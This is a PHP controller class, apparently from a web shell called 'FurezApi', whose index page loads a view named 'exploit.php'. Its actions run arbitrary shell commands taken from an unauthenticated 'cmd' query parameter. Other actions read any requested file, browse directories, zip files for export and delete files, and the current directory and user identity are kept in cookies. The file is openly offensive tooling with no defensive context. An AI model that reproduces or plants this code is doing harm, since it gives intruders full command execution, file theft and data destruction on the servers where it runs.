<?php
namespace FurezApi\Controller;

use FurezApi\Service\ShellService;
use FurezApi\Service\XMLService;
use FurezApi\Service\CookieService;

class MainController {
    public function __construct($router) {
        $this->shell = new shellService();
        $this->xml = new xmlService();
        $this->cookie = new cookieService();
        $this->router = $router;
    }

    public function indexAction() {
        if(!isset($this->shell->isWindow)) {
            exit(include("ressource/views/error-400.php"));
        }

        if(!isset($_COOKIE['api'])) {
            $cur_dir = $this->shell->getCurrentDir();
            $identity = $this->shell->getIdentity();

            $racine_relativePath = $this->shell->getRacineRelativePath();
            $context = $this->shell->getContext($racine_relativePath);
            $parent_dir = $this->shell->getParentDir($context);
            $total = $this->shell->getTotal($context);

            $this->cookie->storeInCache($cur_dir, $context, $racine_relativePath, $total, $identity, $parent_dir);
        } else {
            if($this->cookie->checkCookie($this->shell)) {
                header('Location: '.$this->router->generate('index'));
            }

            $cur_dir = $_COOKIE['cur_dir'];
            $context = $_COOKIE['context'];
            $total = $_COOKIE['total'];
            $identity = $_COOKIE['identity'];
            $parent_dir = $_SESSION['parent_dir'];
        }

        isset($_SESSION['flash']) ? $flash = $_SESSION['flash'] : $flash = null;
        unset($_SESSION['flash']);

        $folder_structure = $this->shell->showFolderContent($parent_dir);
        exit(include("ressource/views/exploit.php"));
    }

    public function cmdAction() {
        $cmd = $_GET['cmd'];
        $result = $this->shell->callShell($cmd);

        exit($result);
    }

    public function folderAction() {
        $folder = $_GET['folder'];
        $folder_content = $this->shell->getFolderContent($folder);
        $folder_content = $this->shell->showFolderContent($folder_content);

        exit($folder_content);
    }

    public function fileAction() {
        $file = $_GET['filename'];
        $file_content = $this->shell->getFileContent($file);

        exit($file_content);
    }

    public function zipAction() {
        $element = $_GET['element'];
        $context = $_GET['context'];
        $export_dir = $_GET['exportdir'];
        $result = $this->shell->zipElement($element, $context, $export_dir);

        exit(json_encode($result));
    }

    public function deleteAction() {
        $element = $_GET['element'];
        $context = $_GET['context'];
        $result = $this->shell->deleteElement($element, $context);

        exit($result);
    }

    public function reloadBundleAction() {
        unset($_SESSION['bundles_controller']);
        unset($_SESSION['bundles_views']);
        unset($_SESSION['allRoutes']);

        header('Location: '.$this->router->generate('index'));
    }
}
